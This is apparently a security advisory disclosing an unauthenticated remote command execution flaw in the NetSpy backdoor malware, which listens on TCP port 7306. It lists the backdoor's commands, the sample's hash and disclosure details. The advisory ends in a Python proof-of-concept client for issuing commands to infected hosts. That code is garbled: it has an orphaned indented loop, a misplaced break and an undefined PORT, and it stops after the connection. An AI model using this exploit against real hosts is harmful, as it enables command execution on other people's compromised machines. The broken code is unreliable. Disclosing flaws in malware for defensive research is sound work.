Threat: Backdoor.Win32.NetSpy.10
Vulnerability: Unauthenticated Remote Command Execution
Description: The malware listens on TCP port 7306. Attackers who can reach
infected hosts can run commands made available by the backdoor. Sending
commands using Ncat and Telnet both fail with errors, probably don't like
the linefeed chars, so need to write your own custom client. Example
commands avail are put, mkd, exec and msg.
Family: NetSpy
Type: PE32
MD5: 45d413b46f1d14a45e8fd36921813d62
Vuln ID: MVID-2022-0551
Disclosure: 04/14/2022

Exploit/PoC:
from socket import *
import time

MALWARE_HOST="x.x.x.x"

    res=""
    while True:
        res += s.recv(512)
        break
        if "\0" in res or "\n" in res or res == "":
            break
    return res

def doit():
    s=socket(AF_INET, SOCK_STREAM)
    s.connect((MALWARE_HOST, PORT))
